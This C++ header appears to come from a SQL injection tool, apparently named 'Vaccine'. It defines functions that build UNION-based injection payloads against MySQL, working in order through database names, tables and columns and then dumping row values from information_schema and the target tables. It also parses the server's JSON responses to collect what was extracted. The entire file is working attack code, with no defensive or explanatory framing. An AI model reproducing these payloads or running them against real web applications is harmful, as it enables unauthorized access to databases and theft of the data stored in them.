#ifndef SQLI_MYSQL
#define SQLI_MYSQL

#include "Vaccine.hpp"

struct sqli_mysql
{
        inline static const str_vector _excluded = {
            "information_schema",
            "mysql",
            "performance_schema",
            "sys",
        };

        // =========================================== UNION BASED PAYLOADS
        static std::string union_based_db_payload(const sptr_vector params)
        {
                const std::string offset = *params[0];
                *params[0] += "null, ";
                return "' UNION SELECT " + offset + "schema_name " +
                       "FROM information_schema.schemata-- ";
        };

        static std::string union_based_tab_payload(const sptr_vector params)
        {
                return "' UNION SELECT " + *params[0] + "table_name " +
                       "FROM information_schema.tables " +
                       "WHERE table_schema='" + *params[1] + "'-- ";
        };

        static std::string union_based_col_payload(const sptr_vector params)
        {
                return "' UNION SELECT " + *params[1] + "column_name " +
                       "FROM information_schema.columns " +
                       "WHERE table_schema='" + *params[2] + "' " +
                       "AND table_name='" + *params[0] + "'-- ";
        };

        static std::string union_based_val_payload(const sptr_vector params)
        {
                return "' UNION SELECT " + *params[2] + *params[1] + " " +
                       "FROM " + *params[3] + "." + *params[0] + "-- ";
        };

        // =========================================== UNION BASED PARSER
        static str_vector union_based_parser(const std::string& response)
        {
                str_vector values;
                Json::Value entries;
                std::string errors;
                Json::CharReaderBuilder builder;
                std::unique_ptr< Json::CharReader > reader(builder.newCharReader());
                if (!reader->parse(
                        response.c_str(),
                        response.c_str() + response.size(),
                        &entries,
                        &errors))
                {
                        std::cerr << "[ ERROR ] Could not parse server response."
                                  << std::endl;
                        return values;
                }
                for (const auto& member : entries.getMemberNames())
                {
                        if (!entries[member].isArray())
                                continue;
                        if (entries[member].empty())
                                values.push_back(std::string());

                        for (const auto& entry : entries[member])
                        {
                                for (const auto& key : entry.getMemberNames())
                                {
                                        if (entry[key].isNull())
                                                continue;
                                        std::string entry_str;
                                        try
                                        {
                                                entry_str = entry[key].asString();
                                        }
                                        catch (const std::exception& e)
                                        {
                                                entry_str = "NOT_CONVERTIBLE";
                                        }
                                        values.push_back(entry_str);
                                        break;
                                }
                        }
                        break;
                }
                return values;
        };
};
#endif
